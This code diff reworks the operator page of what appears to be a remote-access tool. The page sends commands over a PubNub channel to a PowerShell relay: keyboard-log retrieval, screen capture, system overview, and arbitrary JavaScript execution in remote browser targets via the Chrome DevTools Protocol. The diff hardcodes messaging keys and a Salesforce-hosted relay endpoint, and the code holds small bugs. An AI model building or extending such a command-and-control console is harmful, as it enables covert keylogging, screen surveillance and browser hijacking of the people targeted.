@@ -60,6 +60,7 @@
 <body>
     <h1>PubNub Message Publisher</h1>
 
+    <!-- PubNuB configs -->
     <table>
         <tr>
             <td><label for="pubnub_subscriber_key">PubNub Subscriber Key:</label></td>
@@ -92,110 +93,116 @@
 
     <br/>
 
-    <!-- message body -->
-    <div>
-        <table>
-            <tr>
-                <td>
-                    <label for="messages">Messages:</label>
-                    <select id="messages" name="messages">
-                        <option value="SendTestMessage">SendTestMessage</option>
-                        <option value="GetFrontendUrls">GetFrontendUrls</option>
-                        <option value="GetScreenCapture">GetScreenCapture</option>
-                        <option value="GetKeyboardLog">GetKeyboardLog</option>
-                        <option value="GetSystemOverview">GetSystemOverview</option>
-                        <option value="GetClientCommands">GetClientCommands</option>
-                    </select>              
-                </td>
-                <td>
-                    <button onclick="writeMessage(createBuiltInCmd(document.getElementById('messages').value));">Write Message</button></br></br>
-                </td>
-                <td>
-                    <button onclick="sendMessageStr(document.getElementById('message_body').value)">Send Message</button></br></br>
-                </td>
-                <td>
-                    <button onclick="document.getElementById('message_body').value=''">Clear Message</button></br></br>
-                </td>
-            </tr>
-        </table>
-        <textarea id="message_body" class="large-textbox" placeholder="Type your monospace text here..."></textarea></br>
-        
-    </div>
+    <table>
+        <tr>
+            <td>Log to Console:</td>
+            <td>
+                <input type="checkbox" id="logToConsoleOpt" checked>
+            </td>
+        </tr>
+        <tr>
+            <td>Send PubNub Broadcasts:</td>
+            <td>
+                <input type="checkbox" id="sendPBBroadcastOpt" checked>
+            </td>
+        </tr>
+    </table>
 
     <br/>
-    <br/>
+
+    <!-- issue built-in commands -->
+    <table>
+        <tr>
+            <td colspan="2">
+                <label for="builtinCommands">Built-In Commands:</label>
+                <select id="builtinCommands" name="builtinCommands">
+                    <option value="SendTestMessage">SendTestMessage</option>
+                    <option value="GetScreenCapture">GetScreenCapture</option>
+                    <option value="GetKeyboardLog">GetKeyboardLog</option>
+                    <option value="GetSystemOverview">GetSystemOverview</option>
+                </select>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <button onclick="execBuiltInCmd()">Issue Command</button></br></br>
+            </td>
+            <td>
+            </td>
+        </tr>
+    </table>
+        
 
     <!-- issue CDP commands to target  -->
-    <div>
-        <table>
-            <tr>
-                <td>Targets:</td>
-                <td>
-                    <select id="targetIdList" name="targetIdList" onchange="handleTargetIdChange(this);">
-                    </select>                  
-                </td>
-            </tr>
-            <tr>
-                <td>
-                    Target ID:
-                </td>
-                <td>
-                    <input type="hidden" id="targetId" value="">
-                    <input type="text" id="targetIdText" onchange="handleTargetIdChange(this);">
-                </td>
-            </tr>
-            <tr>
-                <td>Session ID:</td>
-                <td id="targetSessionId">
-                </td>
-            </tr>
-            <tr>
-                <td>Title:</td>
-                <td id="targetTitle">
-                </td>
-            </tr>
-            <tr>
-                <td>URL:</td>
-                <td id="targetURL">
-                </td>
-            </tr>
-            <tr>
-                <td>devtoolsFrontendUrl:</td>
-                <td id="targetDebugURL">
-                </td>
-            </tr>
-            <tr>
-                <td>
-                    Command:
-                </td>
-                <td>
-                    <select id="cmdname" name="cmdname" onchange="handleCmdnameChange(this);">
-                        <option value="ExecEvaluate">ExecEvaluate</option>                        
-                        <option value="GetTargetText">GetTargetText</option>
-                        <option value="GetTargetHTML">GetTargetHTML</option>
-                        <option value="GetTargetScreenCapture">GetTargetScreenCapture</option>
-                        <option value="LoadQueue">LoadQueue</option>
-                        <option value="RefreshDOM">RefreshDOM</option>
-                    </select>
-                </td>
-            </tr>
-            <tr>
-                <td colspan="2">
-                    <textarea id="evaluateCmd" class="code-input" placeholder="Type your code here..."></textarea>
-                </td>
-            </tr>
-        </table>
-        <table>
-            <tr>
-                <td style="text-align: right;"><input type="button" value="Execute" onclick="executeTargetCmd();"></td>
-                <td><input type="button" value="Clear" onclick="document.getElementById('evaluateCmd').value='';"></td>
-                <td>
-                    <input type="button" value="GetBoundingRect" onclick="insertJSCode('GetBoundingRect');">
-                </td>
-            </tr>
-        </table>
+    <table>
+        <tr>
+            <td>Targets:</td>
+            <td>
+                <select id="targetIdList" name="targetIdList" onchange="handleTargetIdChange(this);">
+                </select>                  
+            </td>
+        </tr>
+        <tr>
+            <td>
+                Target ID:
+            </td>
+            <td>
+                <input type="hidden" id="targetId" value="">
+                <input type="text" id="targetIdText" onchange="handleTargetIdChange(this);">
+            </td>
+        </tr>
+        <tr>
+            <td>Session ID:</td>
+            <td id="targetSessionId">
+            </td>
+        </tr>
+        <tr>
+            <td>Title:</td>
+            <td id="targetTitle">
+            </td>
+        </tr>
+        <tr>
+            <td>URL:</td>
+            <td id="targetURL">
+            </td>
+        </tr>
+        <tr>
+            <td>devtoolsFrontendUrl:</td>
+            <td id="targetDebugURL">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                Command:
+            </td>
+            <td>
+                <select id="cmdname" name="cmdname" onchange="handleCmdnameChange(this);">
+                    <option value="ExecEvaluate">ExecEvaluate</option>                        
+                    <option value="GetTargetText">GetTargetText</option>
+                    <option value="GetTargetHTML">GetTargetHTML</option>
+                    <option value="GetTargetScreenCapture">GetTargetScreenCapture</option>
+                    <option value="LoadQueue">LoadQueue</option>
+                    <option value="RefreshDOM">RefreshDOM</option>
+                </select>
+            </td>
+        </tr>
+        <tr>
+            <td colspan="2">
+                <textarea id="evaluateCmd" class="code-input" placeholder="Type your code here..."></textarea>
+            </td>
+        </tr>
+    </table>
+    
+    <table>
+        <tr>
+            <td style="text-align: right;"><input type="button" value="Execute" onclick="executeTargetCmd();"></td>
+            <td><input type="button" value="Clear" onclick="document.getElementById('evaluateCmd').value='';"></td>
+            <td>
+                <input type="button" value="GetBoundingRect" onclick="insertJSCode('GetBoundingRect');">
+            </td>
+        </tr>
+    </table>
 
-    </div>
 
     <br/>
 
@@ -204,6 +211,24 @@
 
     </div>
 
+    <br/>
+
+    <!-- Built-In Commands -->
+    <table border="1">
+        <tr>
+            <th>Built-In Commands (
+            <a href="javascript:void(0);" onclick="collapseTable('commandsList');">Collapse</a> |                
+            <a href="javascript:void(0);" onclick="expandTable('commandsList');">Expand</a> |
+            <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetClientCommands'));">Get Commands</a> |
+            <a href="javascript:void(0);" onclick="clearTable('commandsList');">Clear</a> )
+        </th>
+        </tr>
+    </table>
+
+    <table id="builtincmdsList" border="1">
+    </table>
+
+    <br/>
     <br/>
 
     <!-- DOM explorer -->
@@ -217,6 +242,16 @@
             <a href="javascript:void(0);" onclick="expandTable('resultsList');">Expand</a> |
             <a href="javascript:void(0);" onclick="clearTable('domList');">Clear</a> )</th>
         </tr>
+        <tr>
+            <td>
+                <select id="targetIdList" name="targetIdList" onchange="handleDOMTargetIdChange(this);"></select>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <inpyt type="text" id="targetIdText" name="targetIdText" onchange="handleDOMTargetIdChange(this);"></select>
+            </td>
+        </tr>
     </table>
 
     <table id="domList">
@@ -225,23 +260,6 @@
     <br/>
     <br/>
     
-    <!-- results -->
-    <table border="1">
-        <tr>
-            <th>Results (
-            <a href="javascript:void(0);" onclick="collapseTable('resultsList');">Collapse</a> |                
-            <a href="javascript:void(0);" onclick="expandTable('resultsList');">Expand</a> |
-            <a href="javascript:void(0);" onclick="clearTable('resultsList');">Clear</a> )</th>
-        </tr>
-    </table>
-
-    <table id="resultsList">
-    </table>
-
-
-    <br/>
-    <br/>
-
     <!-- targets -->
 
     <table border="1">
@@ -263,11 +281,11 @@
 
     <br/>
     <br/>
-    
-    <!-- commands -->
+
+    <!-- CDP commands -->
     <table border="1">
         <tr>
-            <th>Commands (
+            <th>CDP Commands (
             <a href="javascript:void(0);" onclick="collapseTable('commandsList');">Collapse</a> |                
             <a href="javascript:void(0);" onclick="expandTable('commandsList');">Expand</a> |
             <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetClientCommands'));">Get Commands</a> |
@@ -282,8 +300,43 @@
     <br/>
     <br/>
 
+    <!-- results -->
+    <table border="1">
+        <tr>
+            <th>CDP Results (
+            <a href="javascript:void(0);" onclick="collapseTable('resultsList');">Collapse</a> |                
+            <a href="javascript:void(0);" onclick="expandTable('resultsList');">Expand</a> |
+            <a href="javascript:void(0);" onclick="clearTable('resultsList');">Clear</a> )</th>
+        </tr>
+    </table>
+
+    <table id="resultsList">
+    </table>
+
+    <br/>
+    <br/>
+
+    <!-- console logs -->
+    <table border="1">
+        <tr>
+            <th style="text-align: left;">
+                Console Logs ( 
+                    <a href="javascript:void(0);" onclick="expandTable('messagesTable');">Expand</a> | 
+                    <a href="javascript:void(0);" onclick="collapseTable('messagesTable');">Collapse</a> | 
+                    <a href="javascript:void(0);" onclick="clearTable('messagesTable');">Clear</a> |
+                    <a href="javascript:void(0);" onclick="refreshMessages();">Refresh</a> )
+            </th>
+        </tr>
+    </table>
+    <table id="consolelogsTable" border="1">
+        <tr>
+        </tr>
+    </table>
+
+    <br/>
+    <br/>
+
     <!-- pb messages -->
-     
     <table border="1">
         <tr>
             <th style="text-align: left;">
@@ -308,8 +361,14 @@
         </tr>
         <tr>
             <td>
-                <label for="messagesBroadcast">Broadcast Messages:</label>
-                <input type="checkbox" id="messagesBroadcast" name="messagesBroadcast" value="messagesBroadcast" onchange="toggleMessages();">
+                <label for="messagesBroadcast">Inbound Broadcast Messages:</label>
+                <input type="checkbox" id="messagesInBroadcastOpt" onchange="toggleMessages();">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <label for="messagesBroadcast">Outbound Broadcast Messages:</label>
+                <input type="checkbox" id="messagesOutBroadcastOpt" onchange="toggleMessages();">
             </td>
         </tr>
         <tr>
@@ -338,6 +397,343 @@
         </tr>
     </table>
  
+    <script src="./client_pubnub.helper.js"></script>
+    <script src="./client_pubnub.js"></script>
+
+
+    <!-- globals + pubnub -->
+    <script>
+
+        let jscodelist = {
+            "GetBoundingRect":`(() => {
+
+                let coords = elem.getBoundingClientRect()
+                let x_pos = (coords.left + coords.right) / 2;
+                let y_pos = (coords.top + coords.bottom) / 2;
+                
+                return { "x_pos":x_pos, "y_pos":y_pos };
+                
+                })();`
+        };
+
+        let msgindex = 1;
+        let messagelist = [];
+
+        let screencapture_chunks=[];
+
+        let commandslist = [];
+        let targetslist = [];
+
+        let pubnubconfig = {
+            publishKey: "pub-c-bd83b994-1964-4760-9bf2-142ceadf7f66",
+            subscribeKey: "sub-c-62ba6c3d-b786-4be3-a033-e472ab227774",
+            userId: "client_pubnub.html"
+        };
+
+        const pubnub = new PubNub(pubnubconfig);
+
+        const client_channel = 'clientid_88992233_JS_client';
+        
+		pubnub.addListener({
+            status: function(statusEvent) {
+                try { let msgstr = JSON.stringify(statusEvent); } catch (ex) { }
+
+                logmsg("status event: " + msgstr);
+
+                if (statusEvent.category === "PNConnectedCategory") {
+                    logmsg("PubNub Status Notification -- Successfully connected locally!");
+                }
+            },
+            
+			presence: function(messageEvent) {
+                try {
+                    let msgstr = JSON.stringify(messageEvent);
+                } catch (ex) {
+
+                }
+
+                logmsg("presence event: " + msgstr);
+			},
+
+            message: function(messageEvent) {
+                
+                logmsg("new PubNub message received: ", messageEvent);
+                
+                try {
+                    addMessage(messageEvent);
+
+                    processMessage(messageEvent);
+
+                    let payload = MessageToPayload(messageEvent, 'PubNubMessage', msgindex++);
+
+                    messagelist.push(payload);
+
+                    let payloadjson = JSON.stringify(payload);
+
+                } catch (ex) {
+                    logmsg(ex);
+                }
+            }
+
+        });
+
+        pubnub.subscribe({
+            channels: [client_channel]
+        });        
+
+        try {
+            let elem = null;
+            elem = document.getElementById('pubnub_channel');
+            elem.value = client_channel;
+
+            elem = document.getElementById('pubnub_subscriber_key');
+            elem.value = pubnubconfig.subscribeKey;
+
+            elem = document.getElementById('pubnub_publisher_key');
+            elem.value = pubnubconfig.publishKey;
+
+            elem = document.getElementById('pubnub_uuid');
+            elem.value = pubnubconfig.userId;
+        } catch (err) {
+            LogMsg(err);
+        }
+
+        setInterval(() => {
+            let opts = getOpts();
+
+            if ( ! opts['sendPBBroadcast'] ) {
+                return;
+            }
+
+            let payload = createBuiltInCmd('SendBroadcast');
+            payload.destination = 'BROADCAST';
+            sendMessage(payload);
+        }, 5000);
+
+        setInterval(() => {
+            let opts = getOpts();
+
+            if ( ! opts['logToConsole'] ) {
+                return;
+            }
+
+            logmsg('ping ' + getRandomCode(8));
+
+        }, 5000);
+
+        window.onerror = function (message, source, lineno, colno, error) {
+            console.error('Caught global error:', {
+                message,
+                source,
+                lineno,
+                colno,
+                stack: error ? error.stack : null
+            });
+            
+            // Return true to prevent the error from firing the default console error / browser behavior
+            // Return false to let it bubble normally
+            return true;
+        };
+
+        const jscdp = new JSCDP();
+        const jspb = new JSPubNub(pubnub);
+    </script>
+
+    <!-- inbound/outbound messaging -->
+    <script>
+        
+        function createBuiltInCmd(cmdname) {
+
+            let payload = { 
+                builtincmd: cmdname,
+                source: "client_pubnub.html",
+                destination: "pscdp.relay.ps1",
+                cmdid: getRandomCode(8),
+                ts: Date.now()
+            };
+
+            return payload;
+        }
+
+        function sendMessageStr(jsonstr) {
+            let obj = JSON.parse(jsonstr);
+            sendMessage(obj);
+        }
+
+        function sendMessage(payload) {
+            if ( payload.destination != 'BROADCAST' && payload.destination != 'client_pubnub.html' ) {
+                writeMessage(payload);
+            }
+
+            pubnub.publish({
+                message: payload,
+                channel: client_channel
+            }, (status, response) => {
+                if (status.error) {
+                    payload.error = status;
+                    LogMsg("Publish failed: " + status.toJSON());
+                } else {
+                    payload.response = response;
+                    LogMsg("Message published successfully with timetoken:" + response.timetoken);
+                }
+            });
+        }
+
+        function processMessage(messageEvent) {
+
+            let message = messageEvent.message;
+
+            if ( message.destination != 'client_pubnub.html' ) {
+                return;
+            } else if ( message.builtincmd == 'BROADCAST' ) {
+                return;
+            }
+
+            let cmdfuncname = "process_" + message.builtincmd;
+            let cmdfunc = null;
+
+            if (typeof window[cmdfuncname] === "function") {
+                cmdfunc = window[cmdfuncname];
+            } else {
+                throw new Error(`built in cmd name does not exist ${cmdfuncname}`)
+            }
+
+            try {
+                return cmdfunc(message.result, message); // TODO refactor to use message
+            } catch (ex) {
+                logmsg(ex);
+            }
+
+        }
+
+        function process_GetTargetScreenCapture(result, message) {
+
+            let chunkcount = message['chunkcount']
+            let chunksize = message['chunksize']
+            let chunkindex = message['chunkindex']
+            let remainderlength = message['remainderlength']
+            let imagedata = result['imagedata']
+            
+            screencapture_chunks.push({
+                chunkcount:chunkcount,
+                chunksize:chunksize,
+                chunkindex:chunkindex,
+                remainderlength:remainderlength,
+                imagedata:imagedata
+            });
+
+            if ( chunkindex == chunkcount - 1 ) {
+                combineChunks();
+            }
+        }
+
+        function combineChunks() {
+            console.log('combineChunks');
+
+            screencapture_chunks.sort((a, b) => Number(a.chunkindex) - Number(b.chunkindex));
+
+            let imagestr = '';
+            
+            for ( let i = 0; i<screencapture_chunks.length;i++) {
+                imagestr += screencapture_chunks[i].imagedata;
+            }
+
+            screencapture_chunks = [];
+
+            const containerDiv = document.getElementById('screen_capture');
+
+            const base64String = 'data:image/png;base64,'+imagestr;
+
+            const img = document.createElement('img');
+
+            img.src = base64String;
+            img.alt = 'Inserted Base64 Image';
+
+            containerDiv.appendChild(img);
+        }
+
+        function process_RefreshTargets(result) {
+            let targets = result;
+            refreshTargets(targets);
+        }
+
+        function process_GetTargetText(result) {
+            console.log('GetTargetText');
+            // TODO implement -- show text in ui
+        }
+
+        function process_GetClientCommands(result) {
+            refreshCommandsTable(result);
+        }
+
+        function process_GetTargetHTML(result, message) {        
+            logmsg('GetTargetHTML');        
+        }
+
+        function process_RefreshDOM(result, message) {
+
+            result = atob(result);
+
+            try {
+                result = JSON.parse(result);
+            } catch (ex) {
+                logmsg(ex);
+            }
+
+            result = result || {};
+
+            refreshTable('domList', result);
+
+            reloadJsonTree(result);
+        }
+
+        function process_GetFrontendUrls(result, message) {
+
+            if (Array.isArray(result) && result.length > 0) {
+                result = result[0];
+            }
+
+            document.getElementById('devtoolsFrontendUrl').value = result.devtoolsFrontendUrl;
+        }
+
+        function process_GetTargets(result, message) {
+            try {
+                if ( message.isbase64 ) {
+                    result = atob(result);
+                    result = JSON.parse(result);
+                }
+            } catch (e) {
+
+            }
+
+            let targets = result;
+            // TODO validate targets before updating
+            targetslist = targets;
+            refreshTargets(targets);
+        }
+
+        function process_ExecEvaluate(result, message) {
+
+            result = atob(result);
+            try {
+                result = JSON.parse(result);
+            } catch (ex) {
+                
+            }
+
+            result = result || {};
+            
+            keys = [ 'builtincmd', 'cmdid', 'resultid', 'targetId' ];
+
+            keys.forEach( key => {
+                result[key] = message[key];
+            });
+            
+            addResult(result);
+        }
+
+    </script>
+
     <!-- populate/refresh/update ui -->
     <script>
         function updateTargetId() {
@@ -372,26 +768,33 @@
             document.getElementById('processCDPUrl').value = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/processcdp'+relativeUrl;
         }
 
-        function refreshMessages(messages) {
+        function refreshMessages() {
 
-            let opts = getOpts();
-
-            if ( ! messages || messages.length == 0 ) {
+            if ( ! messagelist || messagelist.length == 0 ) {
                 logmsg("messages list empty or null");
                 return;
             }
 
             clearTable('messagesTable');
 
-            for ( let i = 0; i<messages.length; i++) {
-                let msg = messages[i];
+            let opts = getOpts();
 
-                let addmsg = showMessage(msg);
+            let tmessagelist = [];
+            for ( let i = 0; i<messagelist.length; i++) {
+                let msg = messagelist[i];
+
+                let addmsg = showMessage(msg, opts);
 
                 if ( addmsg ) {
-                    addMessage(msg);
+                    tmessagelist.push(msg);
                 }
 
+            }
+
+            for ( let i = 0; i<tmessagelist.length; i++) {
+                let msg = tmessagelist[i];
+
+                addMessage(msg);
             }
         }
 
@@ -404,16 +807,18 @@
             );
         }
 
-        function showMessage(msg) {
-            let opts = getOpts();
+        let scriptfname = 'client_pubnub.html';
 
+        function showMessage(msg, opts) {
             let addmsg = false;
 
-            if ( opts.broadcast && msg.message.destination == 'BROADCAST' ) {
+            if ( opts.broadcastin && msg.message.destination == 'BROADCAST' && msg.message.source != scriptfname ) {
                 addmsg = true;
-            } else if ( opts.inbound && msg.message.destination == 'client_pubnub.html' ) {
+            } else if ( opts.broadcastout && msg.message.destination == 'BROADCAST' && msg.message.source == scriptfname ) {
                 addmsg = true;
-            } else if ( opts.outbound && msg.message.source == 'client_pubnub.html' ) {
+            } else if ( opts.inbound && msg.message.destination == scriptfname ) {
+                addmsg = true;
+            } else if ( opts.outbound && msg.message.source == scriptfname ) {
                 addmsg = true;
             } else if ( opts.cdprelay && msg.message.builtincmd == 'ProcessCDP' ) {
                 addmsg = true;
@@ -439,67 +844,15 @@
 
         function addMessage(message) {
             
-            if ( ! showMessage(message) ) {
+            let opts = getOpts();
+
+            if ( ! showMessage(message, opts) ) {
                 return;
             }
 
             const table = document.getElementById("messagesTable");
-            const tbody = table.createTBody();
 
-            let insertrow = (key, item) => {
-                let newRow = tbody.insertRow(-1);
-
-                let newCell = newRow.insertCell(0);
-                newCell.textContent = key;
-
-                newCell = newRow.insertCell(1);
-                let txt = JSON.stringify(item, null, 2);
-
-                if ( txt.startsWith('"') && txt.endsWith('"') ) {
-                    txt = txt.slice(1, -1);
-                }
-
-                newCell.textContent = txt;
-            };
-
-            let objStack = [];
-
-            objStack.push( {name:'ROOT', payload:message, path:''} );
-
-            while ( objStack.length > 0 ) {
-                let mobj = objStack.pop()
-                let objName = mobj['name'];
-                let obj = mobj['payload'];
-                let path = mobj['path'];
-                
-                insertrow(path + '.' + objName, '[---------]');
-
-                if ( obj == null ) {
-                    console.log('[8JH4] error');
-                    obj = null;
-                }
-
-                let keys = Object.getOwnPropertyNames(obj);
-
-                for ( let i=0; i<keys.length; i++) {
-                    let key = keys[i];
-                    let item = obj[key];
-
-                    if ( item != null && typeof item == 'object' ) {
-                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName} );
-                        continue;
-                    }
-
-                    insertrow(key, item);
-                }
-
-            }
-
-            newRow = tbody.insertRow(-1);
-            newCell = newRow.insertCell();
-            newCell.textContent = '-------------------- ';
-            newCell.style.backgroundColor = "grey"; 
-            newCell.colSpan = 2;
+            addItem(table, message);
         }
         
         function refreshTargets(targets) {
@@ -806,6 +1159,7 @@
 
         function addItem(table, result) {
             const tbody = table.createTBody();
+            table.prepend(tbody);
 
             let insertrow = (key, item, bgcolor) => {
                 let newRow = tbody.insertRow(-1);
@@ -820,6 +1174,10 @@
                 newCell = newRow.insertCell(1);
                 let txt = JSON.stringify(item, null, 2);
 
+                if ( isNullOrWhitespace(txt) ) { // anchor
+                    txt = 'NULL';
+                }
+
                 if ( txt.startsWith('"') && txt.endsWith('"') ) {
                     txt = txt.slice(1, -1);
                 }
@@ -829,7 +1187,7 @@
 
             let objStack = [];
 
-            objStack.push( {name:'ROOT', payload:result, path:'', bgcolor:"#696969"} );
+            objStack.push( {name:'ROOT', payload:result, path:'', bgcolor:"#696969"} ); // 696969 --> grey
 
             while ( objStack.length > 0 ) {
                 let mobj = objStack.pop()
@@ -846,12 +1204,11 @@
                     let key = keys[i];
                     let item = obj[key];
 
-                    if ( item != null && typeof item == 'object' ) {
+                    if ( item && typeof item == 'object' ) {
                         objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName, bgcolor:"#FFA500"} );
-                        continue;
+                    } else {
+                        insertrow(key, item);
                     }
-
-                    insertrow(key, item);
                 }
 
             }
@@ -860,7 +1217,10 @@
         function getOpts() {
             let inbound = document.getElementById('messagesInbound');
             let outbound = document.getElementById('messagesOutbound'); 
-            let broadcast = document.getElementById('messagesBroadcast'); 
+            
+            let broadcastOut = document.getElementById('messagesOutBroadcastOpt'); 
+            let broadcastIn = document.getElementById('messagesInBroadcastOpt'); 
+
             let cdprelay = document.getElementById('messagesCDPRelay');
             let source = document.getElementById('messagesSource');
             let destination = document.getElementById('messagesDestination');
@@ -868,10 +1228,13 @@
             let opts = {
                 "inbound":inbound.checked,
                 "outbound":outbound.checked,
-                "broadcast":broadcast.checked,
+                "broadcastin":broadcastIn.checked,
+                "broadcastout":broadcastOut.checked,
                 "cdprelay":cdprelay.checked,
                 "source":source,
-                "destination":destination
+                "destination":destination,
+                "logToConsole":document.getElementById('logToConsoleOpt').checked,
+                "sendPBBroadcast":document.getElementById('sendPBBroadcastOpt').checked
             };
 
             return opts;
@@ -892,407 +1255,16 @@
 
     </script>
 
-    <!-- logger + utility funcs -->
-    <script>
-        if ( ! Object.hasOwn ) {
-			Object.hasOwn = (obj, prop) => Object.prototype.hasOwnProperty.call(obj, prop);
-		}
 
-        function getRandomCode(n=8) {
-            let base = 10**(n-1);
-            let top = 10*base;
-            return Math.floor(base + Math.random() * (top-base));
-        }
-
-        let logmsg_index=0
-
-        function ErrorToJson(err) {
-
-            if ( ! err instanceof Error) {
-                return '';
-            }
-    
-            let jsonstr = JSON.stringify(err, (key, val) => {
-
-                if (val instanceof Error) {
-                    return {
-                        name: val.name,
-                        message: val.message,
-                        stack: val.stack,
-                    };
-                }
-
-                return val;
-            });
-
-            return jsonstr;
-        }
-
-        function LogMsg(msg) {
-
-            try {
-                msgstr = '';
-
-                if ( msg instanceof Error ) {
-                    msgstr = ErrorToJson(msg);
-                } else if ( typeof msg === 'string' || msg instanceof String ) {
-                    msgstr = msg;
-                } else {
-                    try { msgstr = JSON.stringify(msg); } catch { }
-                }
-                
-                logmsg_index++;
-                console.log('[client_pubnub.html]|['+logmsg_index+']|'+msgstr);
-            } catch (e) {
-                // discard exception
-            }
-        }
-
-        var logmsg = LogMsg;
-
-                /* 
-        messageEvent.message
-            actualChannel: "clientid_88992233_JS_client"
-            channel: "clientid_88992233_JS_client"
-            message: {msgstr: "ping -- 15:48:40.175"}
-            publisher: "user-717"
-            subscribedChannel: "clientid_88992233_JS_client"
-            subscription: "clientid_88992233_JS_client"
-            timetoken: "17900201204555720"
-        */
-        function MessageToPayload(messageEvent, type, tmsgindex) {
-
-            // const keys = Object.getOwnPropertyNames(messageEvent).filter( (p) => typeof messageEvent[p] === 'string' );
-
-            const eventObj = { ...messageEvent }; 
-
-            if( Object.hasOwn(eventObj, 'message') )
-                delete eventObj.message;
-
-            let payload = { type: type, event: eventObj, message:messageEvent.message, ts:Date.now(), msgindex:tmsgindex };
-
-            return payload;
-        }
-    </script>
-
-    <!-- globals + pubnub -->
-    <script>
-
-        let jscodelist = {
-            "GetBoundingRect":`(() => {
-
-                let coords = elem.getBoundingClientRect()
-                let x_pos = (coords.left + coords.right) / 2;
-                let y_pos = (coords.top + coords.bottom) / 2;
-                
-                return { "x_pos":x_pos, "y_pos":y_pos };
-                
-                })();`
-        };
-
-        let msgindex = 1;
-        let messagelist = [];
-
-        let commandslist = [];
-        let targetslist = [];
-
-        let pubnubconfig = {
-            publishKey: "pub-c-bd83b994-1964-4760-9bf2-142ceadf7f66",
-            subscribeKey: "sub-c-62ba6c3d-b786-4be3-a033-e472ab227774",
-            userId: "client_pubnub.html"
-        };
-
-        const pubnub = new PubNub(pubnubconfig);
-
-        const client_channel = 'clientid_88992233_JS_client';
-        
-		pubnub.addListener({
-            status: function(statusEvent) {
-				if (window.onPubNubEvent) {
-                    try {
-                        let payload = MessageToPayload(statusEvent, 'PubNubStatus', -1);
-                        let payloadjson = JSON.stringify(payload);
-
-                        window.onPubNubEvent(JSON.stringify(payload));
-                    } catch (e) {
-                        logmsg(e);
-                    }				}
-			
-                if (statusEvent.category === "PNConnectedCategory") {
-                    logmsg("PubNub Status Notification -- Successfully connected locally!");
-                }
-            },
-            
-			presence: function(messageEvent) {
-				if (window.onPubNubEvent) {
-					window.onPubNubEvent(JSON.stringify({ type: 'presence', data: messageEvent }));
-				}
-			},
-
-            // internally generated messages get bounced here as well
-            message: function(messageEvent) {
-                console.log("PubNub message received:", messageEvent);
-                
-                try {
-                    addMessage(messageEvent);
-                    processMessage(messageEvent);
-
-                    let payload = MessageToPayload(messageEvent, 'PubNubMessage', msgindex++);
-
-                    messagelist.push(payload);
-
-                    let payloadjson = JSON.stringify(payload);
-                    
-                    // function is defined via CDP command issued by PS1 script --> Runtime.addBinding
-                    if (window.onPubNubEvent) {
-                        window.onPubNubEvent(payloadjson); // delivers message to relay PS1 script running in background
-                    }
-
-                } catch (ex) {
-                    logmsg(ex);
-                }
-            }
-
-        });
-
-        pubnub.subscribe({
-            channels: [client_channel]
-        });        
-
-        try {
-            let elem = null;
-            elem = document.getElementById('pubnub_channel');
-            elem.value = client_channel;
-
-            elem = document.getElementById('pubnub_subscriber_key');
-            elem.value = pubnubconfig.subscribeKey;
-
-            elem = document.getElementById('pubnub_publisher_key');
-            elem.value = pubnubconfig.publishKey;
-
-            elem = document.getElementById('pubnub_uuid');
-            elem.value = pubnubconfig.userId;
-        } catch (err) {
-            LogMsg(err);
-        }
-
-        setInterval(() => {
-            let payload = createBuiltInCmd('SendBroadcast');
-            payload.destination = 'BROADCAST';
-            sendMessage(payload);
-        }, 5000);
-
-        setInterval(() => {
-            logmsg('ping ' + getRandomCode(8));
-        }, 5000);
-
-    </script>
-
-    <!-- inbound/outbound messaging -->
-    <script>
-        
-        function createBuiltInCmd(cmdname) {
-
-            let payload = { 
-                builtincmd: cmdname,
-                source: "client_pubnub.html",
-                destination: "pscdp.relay.ps1",
-                cmdid: getRandomCode(8),
-                ts: Date.now()
-            };
-
-            return payload;
-        }
-
-        function writeMessage(payload) {
-            let elem = document.getElementById('message_body');
-            elem.value = JSON.stringify(payload);
-        }
-
-        function sendMessageStr(jsonstr) {
-            let obj = JSON.parse(jsonstr);
-            sendMessage(obj);
-        }
-
-        function sendMessage(payload) {
-            if ( payload.destination != 'BROADCAST' && payload.destination != 'client_pubnub.html' ) {
-                writeMessage(payload);
-            }
-
-            pubnub.publish({
-                message: payload,
-                channel: client_channel
-            }, (status, response) => {
-                if (status.error) {
-                    payload.error = status;
-                    LogMsg("Publish failed: " + status.toJSON());
-                } else {
-                    payload.response = response;
-                    LogMsg("Message published successfully with timetoken:" + response.timetoken);
-                }
-            });
-        }
-
-        function processMessage(messageEvent) {
-
-            let message = messageEvent.message;
-
-
-            if ( message.destination != 'client_pubnub.html' ) {
-                return;
-            } else if ( message.builtincmd == 'BROADCAST' ) {
-                return;
-            }
-
-            let cmdfuncname = "process_" + message.builtincmd;
-            let cmdfunc = null;
-
-            if (typeof window[cmdfuncname] === "function") {
-                cmdfunc = window[cmdfuncname];
-            } else {
-                throw new Error(`built in cmd name does not exist ${cmdfuncname}`)
-            }
-
-            try {
-                return cmdfunc(message.result, message);
-            } catch (ex) {
-                logmsg(ex);
-            }
-
-        }
-
-        screencapture_chunks=[];
-
-        function process_GetTargetScreenCapture(result, message) {
-            // anchor
-            let chunkcount = message['chunkcount']
-            let chunksize = message['chunksize']
-            let chunkindex = message['chunkindex']
-            let remainderlength = message['remainderlength']
-            let imagedata = result['imagedata']
-            
-            screencapture_chunks.push({
-                chunkcount:chunkcount,
-                chunksize:chunksize,
-                chunkindex:chunkindex,
-                remainderlength:remainderlength,
-                imagedata:imagedata
-            });
-
-            if ( chunkindex == chunkcount - 1 ) {
-                combineChunks();
-            }
-        }
-
-        function combineChunks() {
-            console.log('combineChunks');
-
-            screencapture_chunks.sort((a, b) => Number(a.chunkindex) - Number(b.chunkindex));
-
-            let imagestr = '';
-            
-            for ( let i = 0; i<screencapture_chunks.length;i++) {
-                imagestr += screencapture_chunks[i].imagedata;
-            }
-
-            screencapture_chunks = [];
-
-            const containerDiv = document.getElementById('screen_capture');
-
-            const base64String = 'data:image/png;base64,'+imagestr;
-
-            const img = document.createElement('img');
-
-            img.src = base64String;
-            img.alt = 'Inserted Base64 Image';
-
-            containerDiv.appendChild(img);
-        }
-
-        function process_RefreshTargets(result) {
-            let targets = result;
